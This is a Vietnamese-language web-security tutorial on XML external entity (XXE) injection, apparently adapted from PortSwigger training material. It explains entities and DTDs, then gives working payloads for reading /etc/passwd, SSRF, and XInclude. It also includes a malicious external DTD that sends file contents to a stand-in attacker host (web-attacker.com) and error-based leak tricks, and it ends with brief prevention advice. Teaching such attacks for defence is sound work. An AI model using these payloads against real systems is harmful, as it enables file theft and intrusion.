<h1>
    XML external entity (XXE) injection
</h1>

![image](https://github.com/user-attachments/assets/9abca823-efa6-473c-90f3-0ecc6fdb6c9e)

<h2>
    Table of Contents:
    
    What is XXE?
    XML entities
    How vulnerabilities arise
    Testing for vulnerabilities
    Exploiting vulnerabilities
    Blind vulnerabilities
    Finding hidden attack surface
    Preventing vulnerabilities
    
</h2>   

# What is XXE?
**XML external entity injection** (also known as **XXE**) là một lỗ hổng bảo mật web cho phép attacker can thiệp vào quá trình xử lý dữ liệu XML của ứng dụng. Nó thường cho phép attacker xem các tệp trên hệ thống tệp của máy chủ ứng dụng và tương tác với bất kỳ hệ thống phụ trợ hoặc bên ngoài nào mà chính ứng dụng có thể truy cập.

Trong một số trường hợp, attacker có thể leo thang cuộc tấn công XXE để xâm phạm máy chủ cơ bản hoặc cơ sở hạ tầng phụ trợ khác, bằng cách lợi dụng lỗ hổng **XXE** để thực hiện các cuộc tấn công **SSRF**.

# XML entities
## What is XML?
**XML** stands for "**extensible markup language**". **XML** là ngôn ngữ được thiết kế để lưu trữ và truyền tải dữ liệu. Giống như HTML, XML sử dụng cấu trúc thẻ tag và dữ liệu dạng cây. Không giống như HTML, **XML** không sử dụng các thẻ được xác định trước và do đó các thẻ có thể được đặt tên để mô tả dữ liệu. Trước đó trong lịch sử web, **XML** đã thịnh hành dưới dạng định dạng truyền dữ liệu ("X" trong "AJAX" là viết tắt của "XML"). Nhưng mức độ phổ biến của nó hiện đã giảm do định dạng JSON.

## What are XML entities?
**XML** các thực thể là một cách thể hiện một mục dữ liệu trong tài liệu **XML**, thay vì sử dụng chính dữ liệu đó. Nhiều thực thể khác nhau được tích hợp sẵn theo đặc tả của ngôn ngữ XML. Ví dụ: các thực thể `&lt;` và `&gt;` đại diện cho các ký tự `<` và `>`. Đây là các siêu ký tự được sử dụng để biểu thị các thẻ XML và do đó thường phải được biểu diễn bằng các thực thể của chúng khi chúng xuất hiện trong dữ liệu.

## What is document type definition?
Định nghĩa loại tài liệu XML **(document type definition) (DTD)** chứa các khai báo có thể xác định cấu trúc của tài liệu **XML**, các loại giá trị dữ liệu mà nó có thể chứa và các mục khác. **DTD** được khai báo trong phần tử `DOCTYPE` tùy chọn ở đầu tài liệu **XML**. **DTD** có thể hoàn toàn độc lập bên trong tài liệu (được gọi là "internal DTD") hoặc có thể được tải từ nơi khác (được gọi là "external DTD") hoặc có thể kết hợp cả hai.

## What are XML custom entities?
**XML** cho phép các thực thể tùy chỉnh được xác định trong **DTD**. Ví dụ:
```
<!DOCTYPE foo [ <!ENTITY myentity "my entity value" > ]>
```
Định nghĩa này có nghĩa là mọi cách sử dụng tham chiếu thực thể `&myentity;` trong tài liệu XML sẽ được thay thế bằng giá trị được xác định: "my entity value".

## What are XML external entities?
Các thực thể bên ngoài **XML** (**XML external**) là một loại thực thể tùy chỉnh có định nghĩa nằm bên ngoài DTD nơi chúng được khai báo.

Việc khai báo một thực thể bên ngoài sử dụng từ khóa `SYSTEM` và phải chỉ định một URL từ đó giá trị của thực thể sẽ được tải. Ví dụ:
```
<!DOCTYPE foo [ <!ENTITY ext SYSTEM "http://normal-website.com" > ]>
```
URL có thể sử dụng giao thức `file://` và do đó các thực thể bên ngoài có thể được tải từ tệp. Ví dụ:
```
<!DOCTYPE foo [ <!ENTITY ext SYSTEM "file:///path/to/file" > ]>
```
Các thực thể bên ngoài **XML** cung cấp các phương tiện chính để phát sinh các cuộc tấn công thực thể XML bên ngoài.

# How do XXE vulnerabilities arise?
Một số ứng dụng sử dụng định dạng **XML** để truyền dữ liệu giữa trình duyệt và máy chủ. Các ứng dụng thực hiện việc này hầu như luôn sử dụng thư viện chuẩn hoặc API nền tảng để xử lý dữ liệu XML trên máy chủ. Lỗ hổng **XXE** phát sinh do đặc tả **XML** chứa nhiều tính năng nguy hiểm tiềm tàng khác nhau và các trình phân tích cú pháp tiêu chuẩn hỗ trợ các tính năng này ngay cả khi chúng thường không được ứng dụng sử dụng.

Các thực thể **XML external** là một loại thực thể XML tùy chỉnh có các giá trị được xác định được tải từ bên ngoài DTD mà chúng được khai báo. Các thực thể bên ngoài đặc biệt thú vị từ góc độ bảo mật vì chúng cho phép xác định một thực thể dựa trên nội dung của đường dẫn tệp hoặc URL.

# How to find and test for XXE vulnerabilities
Phần lớn các lỗ hổng **XXE** có thể được tìm thấy nhanh chóng và đáng tin cậy bằng cách sử dụng trình quét lỗ hổng web của Burp Suite.

Kiểm tra thủ công các lỗ hổng **XXE** thường bao gồm:

- Kiểm tra **khả năng truy xuất tệp** bằng cách xác định một thực thể bên ngoài dựa trên tệp hệ điều hành phổ biến và sử dụng thực thể đó trong dữ liệu được trả về trong phản hồi của ứng dụng.
- Kiểm tra các **lỗ hổng XXE mù** bằng cách xác định một thực thể bên ngoài dựa trên URL tới hệ thống mà bạn kiểm soát và giám sát các tương tác với hệ thống đó. **Burp Collaborator** là sự lựa chọn hoàn hảo cho mục đích này.
- Kiểm tra khả năng bao gồm dễ bị tổn thương của dữ liệu không phải XML do người dùng cung cấp trong tài liệu XML phía máy chủ bằng cách sử dụng cuộc tấn công [XInclude](https://portswigger.net/web-security/xxe#xinclude-attacks) để cố truy xuất tệp hệ điều hành phổ biến.

# Exploiting vulnerabilities

Có nhiều loại tấn công **XXE** khác nhau:

-**Khai thác XXE để truy xuất tệp**, trong đó một thực thể bên ngoài được xác định có chứa nội dung của tệp và được trả về trong phản hồi của ứng dụng.
- Khai thác **XXE để thực hiện các cuộc tấn công SSRF**, trong đó một thực thể bên ngoài được xác định dựa trên URL tới hệ thống phụ trợ.
- Khai thác **XXE mù**, lọc dữ liệu ngoài băng tần, trong đó dữ liệu nhạy cảm được truyền từ máy chủ ứng dụng đến hệ thống mà kẻ tấn công kiểm soát.
- Khai thác **XXE mù để lấy dữ liệu qua thông báo lỗi**, trong đó kẻ tấn công có thể kích hoạt thông báo lỗi phân tích cú pháp chứa dữ liệu nhạy cảm.

## Exploiting XXE to retrieve files
Để thực hiện cuộc tấn công chèn XXE nhằm truy xuất một tệp tùy ý từ hệ thống tệp của máy chủ, bạn cần sửa đổi XML đã gửi theo hai cách:

- Chỉnh sửa phần tử `DOCTYPE` xác định thực thể bên ngoài chứa (**external entity**)đường dẫn đến tệp.
- Chỉnh sửa giá trị dữ liệu trong XML được trả về trong phản hồi của ứng dụng để sử dụng thực thể bên ngoài đã xác định.

Ví dụ: giả sử một ứng dụng mua sắm kiểm tra mức tồn kho của sản phẩm bằng cách gửi XML sau tới máy chủ:
```
<?xml version="1.0" encoding="UTF-8"?>
<stockCheck><productId>381</productId></stockCheck>
```

Ứng dụng không thực hiện biện pháp phòng vệ cụ thể nào trước các cuộc tấn công **XXE**, vì vậy bạn có thể khai thác lỗ hổng **XXE** để truy xuất tệp /etc/passwd bằng cách gửi tải trọng **XXE** sau:
```
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE foo [ <!ENTITY xxe SYSTEM "file:///etc/passwd"> ]>
<stockCheck><productId>&xxe;</productId></stockCheck>
```
Payload **XXE** này xác định một thực thể bên ngoài `&xxe;` có giá trị là nội dung của tệp `/etc/passwd` và sử dụng thực thể trong giá trị `ProductId`. Điều này khiến phản hồi của ứng dụng bao gồm nội dung của tệp:

```
Invalid product ID: root:x:0:0:root:/root:/bin/bash
daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin
bin:x:2:2:bin:/bin:/usr/sbin/nologin
...
```

## Exploiting XXE to perform SSRF attacks
Ngoài việc truy xuất dữ liệu nhạy cảm, tác động chính khác của các cuộc tấn công **XXE** là chúng có thể được sử dụng để thực hiện giả mạo yêu cầu phía máy chủ (**SSRF**). Đây là một lỗ hổng nghiêm trọng tiềm ẩn trong đó ứng dụng phía máy chủ có thể bị lợi dụng để thực hiện các yêu cầu HTTP tới bất kỳ URL nào mà máy chủ có thể truy cập.

Để khai thác lỗ hổng **XXE** nhằm thực hiện cuộc tấn công SSRF, bạn cần xác định một thực thể **XML bên ngoài** bằng URL mà bạn muốn nhắm mục tiêu và sử dụng thực thể đã xác định trong một giá trị dữ liệu. Nếu bạn có thể sử dụng thực thể đã xác định trong giá trị dữ liệu được trả về trong phản hồi của ứng dụng thì bạn sẽ có thể xem phản hồi từ URL trong phản hồi của ứng dụng và do đó có được sự tương tác hai chiều với hệ thống phụ trợ. Nếu không, bạn sẽ chỉ có thể thực hiện các cuộc tấn công **blind SSRF** (vẫn có thể gây ra hậu quả nghiêm trọng).

Trong ví dụ **XXE** sau, thực thể bên ngoài sẽ khiến máy chủ tạo yêu cầu HTTP back-end tới hệ thống nội bộ trong cơ sở hạ tầng của tổ chức:

```
<!DOCTYPE foo [ <!ENTITY xxe SYSTEM "http://internal.vulnerable-website.com/"> ]>
```
# Blind vulnerabilities
## What is blind XXE?
Lỗ hổng **Blind XXE** phát sinh khi ứng dụng dễ bị tiêm **XXE** nhưng không trả về giá trị của bất kỳ thực thể bên ngoài nào được xác định trong phản hồi của nó. Điều này có nghĩa là không thể truy xuất trực tiếp các tệp phía máy chủ và do đó **Blind XXE** thường khó khai thác hơn các lỗ hổng **XXE** thông thường.

Có hai cách chính để bạn có thể tìm và khai thác các lỗ hổng **Blind XXE**

- Bạn có thể kích hoạt out-of-band network interactions, đôi khiexfiltrating dữ liệu nhạy cảm trong dữ liệu tương tác.
- Bạn có thể kích hoạt các lỗi phân tích cú pháp XML theo cách các thông báo lỗi chứa dữ liệu nhạy cảm.

## Detecting blind XXE using out-of-band (OAST) techniques
Bạn thường có thể phát hiện **Blind XXE** bằng cách sử dụng kỹ thuật tương tự như đối với các cuộc tấn công **XXE SSRF** nhưng kích hoạt out-of-band network interaction với hệ thống mà bạn kiểm soát. Ví dụ: bạn sẽ xác định một thực thể bên ngoài như sau:
```
<!DOCTYPE foo [ <!ENTITY xxe SYSTEM "http://f2g9j7hhkax.web-attacker.com"> ]>
```

Sau đó, bạn sẽ sử dụng thực thể được xác định trong một giá trị dữ liệu trong XML.

Cuộc tấn công XXE này khiến máy chủ thực hiện yêu cầu HTTP phụ trợ tới URL được chỉ định. Attacker có thể theo dõi kết quả tra cứu DNS và yêu cầu HTTP, từ đó phát hiện rằng cuộc tấn công XXE đã thành công.

Đôi khi, các cuộc tấn công **XXE** sử dụng các thực thể thông thường bị chặn do một số xác thực đầu vào của ứng dụng hoặc việc tăng cường trình phân tích cú pháp XML đang được sử dụng. Trong trường hợp này, bạn có thể sử dụng các thực thể tham số XML để thay thế. Các thực thể tham số XML là một loại thực thể XML đặc biệt chỉ có thể được tham chiếu ở nơi khác trong DTD. Vì mục đích hiện tại, bạn chỉ cần biết hai điều. Đầu tiên, việc khai báo một thực thể tham số XML bao gồm ký tự phần trăm trước tên thực thể:
```
<!ENTITY % myparameterentity "my parameter entity value" >
```
Và thứ hai, các thực thể tham số được tham chiếu bằng ký tự phần trăm thay vì ký hiệu thông thường:
```
%myparameterentity;
```
Điều này có nghĩa là bạn có thể kiểm tra **blind XXE** bằng cách sử dụng tính năng out-of-band detection thông qua các thực thể tham số XML như sau:
```
<!DOCTYPE foo [ <!ENTITY % xxe SYSTEM "http://f2g9j7hhkax.web-attacker.com"> %xxe; ]>
```
Payload **XXE** này khai báo một thực thể tham số XML có tên là `xxe` và sau đó sử dụng thực thể đó trong DTD. Điều này sẽ thực hiện tra cứu DNS và yêu cầu HTTP tới miền của kẻ tấn công, xác minh rằng cuộc tấn công đã thành công.

## Exploiting blind XXE to exfiltrate data out-of-band
Việc phát hiện lỗ hổng **blind XXE** thông qua các kỹ thuật out-of-band là rất tốt, nhưng nó không thực sự chứng minh được lỗ hổng có thể bị khai thác như thế nào. Điều mà attacker thực sự muốn đạt được là lấy cắp dữ liệu nhạy cảm. Điều này có thể đạt được thông qua lỗ hổng **blind XXE**, nhưng nó liên quan đến việc attacker lưu trữ một **DTD** độc hại trên hệ thống mà chúng kiểm soát, sau đó gọi **DTD** bên ngoài từ bên trong payload **in-band XXE** 

Một ví dụ về DTD độc hại nhằm lấy cắp nội dung của tệp `/etc/passwd` như sau:
```
<!ENTITY % file SYSTEM "file:///etc/passwd">
<!ENTITY % eval "<!ENTITY &#x25; exfiltrate SYSTEM 'http://web-attacker.com/?x=%file;'>">
%eval;
%exfiltrate;
```
**DTD** này thực hiện các bước sau:

- Xác định một thực thể tham số XML được gọi là `file`, chứa nội dung của tệp `/etc/passwd`.
- Xác định một thực thể tham số XML có tên là `eval`, chứa khai báo động của một thực thể tham số XML khác có tên là `exfiltrate`. Thực thể `exfiltrate` sẽ được đánh giá bằng cách tạo một yêu cầu HTTP tới máy chủ web của attacker có chứa giá trị của thực thể tệp trong chuỗi truy vấn URL.
- Sử dụng thực thể `eval` để thực hiện khai báo động của thực thể `exfiltrate`.
- Sử dụng thực thể `exfiltrate` để giá trị của nó được đánh giá bằng cách yêu cầu URL được chỉ định.
- 
Sau đó, attacker phải lưu trữ **DTD** độc hại trên hệ thống mà chúng kiểm soát, thông thường bằng cách tải nó lên máy chủ web của riêng chúng. Ví dụ: attacker có thể phân phối **DTD** độc hại tại URL sau:
```
http://web-attacker.com/malicious.dtd
```

Cuối cùng, attacker phải gửi payload XXE sau tới ứng dụng dễ bị tấn công:
```
<!DOCTYPE foo [<!ENTITY % xxe SYSTEM
"http://web-attacker.com/malicious.dtd"> %xxe;]>
```
Payload XXE này khai báo một thực thể tham số XML có tên là `xxe` và sau đó sử dụng thực thể đó trong **DTD**. Điều này sẽ khiến trình phân tích cú pháp XML tìm nạp **DTD** bên ngoài từ máy chủ của attacker và diễn giải nó nội tuyến. Sau đó, các bước được xác định trong DTD độc hại sẽ được thực thi và tệp `/etc/passwd` được truyền đến máy chủ của attacker.
## Exploiting blind XXE to retrieve data via error messages
Một cách tiếp cận khác để khai thác **blind XXE** là kích hoạt lỗi phân tích cú pháp XML trong đó thông báo lỗi chứa dữ liệu nhạy cảm mà bạn muốn truy xuất. Điều này sẽ có hiệu lực nếu ứng dụng trả về thông báo lỗi trong phản hồi của nó.

Bạn có thể kích hoạt thông báo lỗi phân tích cú pháp XML chứa nội dung của tệp `/etc/passwd` bằng DTD bên ngoài độc hại như sau:
```
<!ENTITY % file SYSTEM "file:///etc/passwd">
<!ENTITY % eval "<!ENTITY &#x25; error SYSTEM 'file:///nonexistent/%file;'>">
%eval;
%error;
```
DTD này thực hiện các bước sau:

- Xác định một thực thể tham số XML được gọi là tệp, chứa nội dung của tệp `/etc/passwd`.
- Xác định một thực thể tham số XML được gọi là `eval`, chứa khai báo động của một thực thể tham số XML khác được gọi là lỗi. Thực thể lỗi sẽ được đánh giá bằng cách tải một tệp không tồn tại có tên chứa giá trị của thực thể tệp.
- Sử dụng thực thể `eval` để thực hiện khai báo động của thực thể lỗi.
- Sử dụng thực thể lỗi để giá trị của nó được đánh giá bằng cách cố tải tệp không tồn tại, dẫn đến thông báo lỗi chứa tên của tệp không tồn tại, là nội dung của tệp `/etc/passwd`.

Việc gọi DTD độc hại bên ngoài sẽ dẫn đến thông báo lỗi như sau:
```
java.io.FileNotFoundException: /nonexistent/root:x:0:0:root:/root:/bin/bash
daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin
bin:x:2:2:bin:/bin:/usr/sbin/nologin
...
```
## Exploiting blind XXE by repurposing a local DTD
Kỹ thuật trước hoạt động tốt với DTD bên ngoài, nhưng thông thường nó sẽ không hoạt động với DTD bên trong được chỉ định đầy đủ trong phần tử `DOCTYPE`. Điều này là do kỹ thuật này liên quan đến việc sử dụng một thực thể tham số **XML** trong định nghĩa của một thực thể tham số khác. Theo đặc tả **XML**, điều này được phép trong các DTD bên ngoài nhưng không được phép trong các DTD bên trong. (Một số trình phân tích cú pháp có thể chấp nhận được điều đó, nhưng nhiều trình phân tích thì không.)

Vậy còn lỗ hổng **blind XXE** khi các tương tác out-of-band bị chặn thì sao? Bạn không thể exfiltrate dữ liệu qua out-of-band connection và bạn không thể tải DTD bên ngoài từ máy chủ từ xa.

Trong trường hợp này, vẫn có thể kích hoạt các thông báo lỗi chứa dữ liệu nhạy cảm do lỗ hổng trong đặc tả ngôn ngữ **XML**. Nếu DTD của tài liệu sử dụng kết hợp các khai báo DTD bên trong và bên ngoài thì DTD bên trong có thể xác định lại các thực thể được khai báo trong DTD bên ngoài. Khi điều này xảy ra, hạn chế về việc sử dụng một thực thể tham số **XML** trong định nghĩa của một thực thể tham số khác sẽ được nới lỏng.

Điều này có nghĩa là attacker có thể sử dụng kỹ thuật **XXE** dựa trên lỗi từ bên trong **DTD nội bộ**, miễn là thực thể tham số XML mà chúng sử dụng đang xác định lại thực thể được khai báo trong DTD bên ngoài. Tất nhiên, nếu các out-of-band connections bị chặn thì DTD bên ngoài không thể được tải từ một vị trí ở xa. Thay vào đó, nó cần phải là một tệp DTD bên ngoài cục bộ trên máy chủ ứng dụng. Về cơ bản, cuộc tấn công liên quan đến việc gọi một tệp DTD tồn tại trên hệ thống tệp cục bộ và tái sử dụng nó để xác định lại một thực thể hiện có theo cách gây ra lỗi phân tích cú pháp chứa dữ liệu nhạy cảm. Kỹ thuật này do Arseniy Sharoglazov tiên phong và xếp thứ 7 trong 10 kỹ thuật hack web hàng đầu năm 2018 của chúng ta.

Ví dụ: giả sử có một tệp DTD trên hệ thống tệp máy chủ tại vị trí `/usr/local/app/schema.dtd` và tệp DTD này xác định một thực thể có tên là `custom_entity`. Attacker có thể kích hoạt thông báo lỗi phân tích cú pháp XML chứa nội dung của tệp `/etc/passwd` bằng cách gửi một DTD lai như sau:
```
<!DOCTYPE foo [
<!ENTITY % local_dtd SYSTEM "file:///usr/local/app/schema.dtd">
<!ENTITY % custom_entity '
<!ENTITY &#x25; file SYSTEM "file:///etc/passwd">
<!ENTITY &#x25; eval "<!ENTITY &#x26;#x25; error SYSTEM &#x27;file:///nonexistent/&#x25;file;&#x27;>">
&#x25;eval;
&#x25;error;
'>
%local_dtd;
]>
```
DTD này thực hiện các bước sau:
- Xác định một thực thể tham số XML có tên `local_dtd`, chứa nội dung của tệp DTD bên ngoài tồn tại trên hệ thống tệp máy chủ.
- Xác định lại thực thể tham số XML có tên `custom_entity`, đã được xác định trong tệp DTD bên ngoài. Thực thể này được xác định lại là chứa khai thác **XXE** dựa trên lỗi đã được mô tả để kích hoạt thông báo lỗi chứa nội dung của tệp `/etc/passwd`.
- Sử dụng thực thể `local_dtd` để diễn giải DTD bên ngoài, bao gồm giá trị được xác định lại của thực thể `custom_entity`. Điều này dẫn đến thông báo lỗi mong muốn.

### Locating an existing DTD file to repurpose
Vì cuộc tấn công **XXE** này liên quan đến việc tái sử dụng một DTD hiện có trên hệ thống tệp máy chủ, nên yêu cầu chính là xác định vị trí tệp phù hợp. Điều này thực sự khá đơn giản. Vì ứng dụng trả về bất kỳ thông báo lỗi nào được trình phân tích cú pháp XML đưa ra nên bạn có thể dễ dàng liệt kê các tệp DTD cục bộ chỉ bằng cách thử tải chúng từ bên trong DTD nội bộ.

Ví dụ: các hệ thống Linux sử dụng môi trường máy tính để bàn Gnome thường có tệp DTD tại `/usr/share/yelp/dtd/docbookx.dtd`. Bạn có thể kiểm tra xem tệp này có tồn tại hay không bằng cách gửi payload XXE sau, điều này sẽ gây ra lỗi nếu thiếu tệp:
```
<!DOCTYPE foo [
<!ENTITY % local_dtd SYSTEM "file:///usr/share/yelp/dtd/docbookx.dtd">
%local_dtd;
]>
```
Sau khi bạn đã kiểm tra danh sách các tệp DTD phổ biến để định vị một tệp hiện có, bạn cần lấy một bản sao của tệp và xem lại nó để tìm một thực thể mà bạn có thể xác định lại. Vì nhiều hệ thống phổ biến bao gồm các tệp DTD là nguồn mở nên thông thường bạn có thể nhanh chóng có được bản sao của tệp thông qua tìm kiếm trên internet.

# Finding hidden attack surface
## XInclude attacks
Một số ứng dụng nhận dữ liệu do khách hàng gửi, nhúng dữ liệu đó ở phía máy chủ vào tài liệu XML rồi phân tích cú pháp tài liệu đó. Một ví dụ về điều này xảy ra khi dữ liệu do khách hàng gửi được đặt vào một yêu cầu back-end SOAP, sau đó được xử lý bởi backend SOAP service.

Trong tình huống này, bạn không thể thực hiện cuộc tấn công **XXE** vì bạn không kiểm soát toàn bộ tài liệu XML và do đó không thể xác định hoặc sửa đổi phần tử `DOCTYPE`. Tuy nhiên, bạn có thể sử dụng `XInclude` thay thế. `XInclude` là một phần của đặc tả XML cho phép xây dựng một tài liệu XML từ các tài liệu phụ. Bạn có thể thực hiện một cuộc tấn công `XInclude` bên trong bất kỳ giá trị dữ liệu nào trong tài liệu XML, do đó cuộc tấn công có thể được thực hiện trong các tình huống mà bạn chỉ kiểm soát một mục dữ liệu duy nhất được đặt vào tài liệu XML phía máy chủ.

Để thực hiện một cuộc tấn công `XInclude`, bạn cần tham chiếu không gian tên `XInclude` và cung cấp đường dẫn đến tệp mà bạn muốn đưa vào. Ví dụ:
```
<foo xmlns:xi="http://www.w3.org/2001/XInclude">
<xi:include parse="text" href="file:///etc/passwd"/></foo>
```
## XXE attacks via file upload
Một số ứng dụng cho phép người dùng tải lên các tệp sau đó được xử lý phía máy chủ. Một số định dạng tệp phổ biến sử dụng XML hoặc chứa các thành phần phụ XML. Ví dụ về các định dạng dựa trên XML là các định dạng tài liệu văn phòng như `DOCX` và các định dạng hình ảnh như `SVG`.

Ví dụ: một ứng dụng có thể cho phép người dùng tải hình ảnh lên và xử lý hoặc xác thực những hình ảnh này trên máy chủ sau khi chúng được tải lên. Ngay cả khi ứng dụng mong muốn nhận được định dạng như PNG hoặc JPEG, thư viện xử lý hình ảnh đang được sử dụng có thể hỗ trợ hình ảnh SVG. Vì định dạng SVG sử dụng XML nên kẻ tấn công có thể gửi hình ảnh SVG độc hại và do đó tiếp cận bề mặt tấn công ẩn để tìm lỗ hổng **XXE**.

## XXE attacks via modified content type
Hầu hết các yêu cầu POST sử dụng loại nội dung mặc định được tạo bởi các biểu mẫu HTML, chẳng hạn như` application/x-www-form-urlencoded`. Một số trang web mong muốn nhận được yêu cầu ở định dạng này nhưng sẽ chấp nhận các loại nội dung khác, bao gồm cả XML.

Ví dụ: nếu một yêu cầu bình thường có nội dung sau:
```
POST /action HTTP/1.0
Content-Type: application/x-www-form-urlencoded
Content-Length: 7

foo=bar
```
Sau đó, bạn có thể gửi yêu cầu sau với kết quả tương tự:
```
POST /action HTTP/1.0
Content-Type: text/xml
Content-Length: 52

<?xml version="1.0" encoding="UTF-8"?><foo>bar</foo>
```
Nếu ứng dụng chấp nhận các yêu cầu chứa XML trong nội dung thư và phân tích nội dung nội dung dưới dạng XML thì bạn có thể tiếp cận attack surface **XXE** ẩn chỉ bằng cách định dạng lại các yêu cầu để sử dụng định dạng XML.

# How to prevent XXE vulnerabilities
Hầu như tất cả các lỗ hổng **XXE** đều phát sinh do thư viện phân tích cú pháp XML của ứng dụng hỗ trợ các tính năng XML nguy hiểm tiềm tàng mà ứng dụng không cần hoặc không có ý định sử dụng. Cách dễ dàng và hiệu quả nhất để ngăn chặn các cuộc tấn công **XXE** là vô hiệu hóa các tính năng đó.

Nói chung, việc vô hiệu hóa độ phân giải của các thực thể bên ngoài và vô hiệu hóa hỗ trợ cho `XInclude` là đủ. Điều này thường có thể được thực hiện thông qua các tùy chọn cấu hình hoặc bằng cách ghi đè hành vi mặc định theo chương trình. Tham khảo tài liệu dành cho thư viện hoặc API phân tích cú pháp XML của bạn để biết chi tiết về cách tắt các chức năng không cần thiết.

